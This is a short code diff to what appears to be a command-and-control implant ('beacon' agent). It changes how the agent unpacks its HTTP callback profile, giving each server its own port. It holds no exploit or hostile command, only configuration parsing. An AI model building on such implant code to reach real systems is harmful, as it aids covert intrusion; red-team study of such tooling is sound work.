@@ -24,12 +24,13 @@ AgentConfig::AgentConfig()
 	
 #if defined(BEACON_HTTP)
 	this->profile.use_ssl       = packer->Unpack8();
-	this->profile.port          = packer->Unpack32();
 	this->profile.servers_count = packer->Unpack32();
 	this->profile.servers       = (BYTE**) MemAllocLocal(this->profile.servers_count * sizeof(LPVOID) );
-	for (int i = 0; i < this->profile.servers_count; i++)
+	this->profile.ports         = (WORD*)  MemAllocLocal(this->profile.servers_count * sizeof(WORD) );
+	for (int i = 0; i < this->profile.servers_count; i++) {
 		this->profile.servers[i] = packer->UnpackBytesCopy(&length);
-
+		this->profile.ports[i]   = (WORD) packer->Unpack32();
+	}
 	this->profile.http_method  = packer->UnpackBytesCopy(&length);
 	this->profile.uri          = packer->UnpackBytesCopy(&length);
 	this->profile.parameter    = packer->UnpackBytesCopy(&length);
